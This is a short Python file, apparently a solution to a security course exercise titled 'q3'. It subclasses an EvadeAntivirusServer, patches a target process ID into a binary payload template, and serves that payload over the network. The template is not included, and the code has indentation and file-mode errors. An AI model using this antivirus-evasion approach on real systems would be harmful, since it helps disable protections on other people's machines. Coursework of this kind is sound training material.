import assemble
import server
import struct


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        
		f=open("q3.template",'rw')
		template =f.read()


		#find the location of the preserved place for the PID
		index = template.find("99999999".decode("hex"))

		#convert the actual PID to little endian
		a = struct.pack("<i", pid)

		#replace the temporary PID with the actual PID
		template= template[0:index] +  a+ template[index+4:]


		return template

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

